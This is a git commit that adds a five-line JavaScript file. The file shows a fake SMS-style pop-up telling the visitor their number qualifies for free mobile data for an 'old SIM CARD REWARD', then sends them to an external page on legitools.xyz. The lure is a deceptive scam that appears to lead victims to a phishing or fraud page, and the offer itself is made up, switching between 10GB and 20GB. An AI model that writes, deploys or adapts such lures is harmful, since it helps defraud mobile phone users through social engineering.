71cf01ca4e86abd73e18a88ad015659755c377ac
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-11-26 16:37:32 -0800

    Create sim.reward-20gbmtn.js

---
+++ sim.reward-20gbmtn.js
@@ -0,0 +1,5 @@
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 10GB Free Data for old SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://legitools.xyz/sim.reward-20gbmtn.html';
+}
